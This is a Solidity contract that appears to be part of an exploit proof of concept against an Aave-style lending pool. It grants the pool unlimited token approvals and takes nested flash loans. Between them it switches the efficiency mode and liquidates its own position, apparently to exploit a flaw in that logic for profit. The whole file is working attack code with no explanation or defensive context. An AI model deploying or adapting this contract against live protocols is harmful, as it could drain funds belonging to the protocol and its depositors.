// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Constants} from "./Constants.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {Initializable} from "openzeppelin-contracts/contracts/proxy/utils/Initializable.sol";

contract Child is Constants, Initializable {
    function initialize() public initializer {
        IERC20(ASSET1).approve(address(POOL), type(uint256).max);
        IERC20(ASSET2).approve(address(POOL), type(uint256).max);
    }

    function execute() public {
        POOL.setUserEMode(EMODE_CATEGORY);

        address[] memory assets = new address[](1);
        assets[0] = ASSET1;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = AMOUNT1;
        uint256[] memory interestRateModes = new uint256[](1);
        interestRateModes[0] = 0;

        POOL.flashLoan(address(this), assets, amounts, interestRateModes, address(this), bytes(""), 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params
    ) external returns (bool) {
        if (assets[0] == ASSET1) {
            POOL.supply(ASSET1, amounts[0], address(this), 0);

            address[] memory assets = new address[](1);
            assets[0] = ASSET2;
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = AMOUNT2;
            uint256[] memory interestRateModes = new uint256[](1);
            interestRateModes[0] = 2;
            POOL.flashLoan(address(this), assets, amounts, interestRateModes, onBehalfOf, bytes(""), 0);
            POOL.liquidationCall(ASSET1, ASSET2, address(this), type(uint256).max, false);
        } else {
            POOL.setUserEMode(0);
        }
        return true;
    }
}
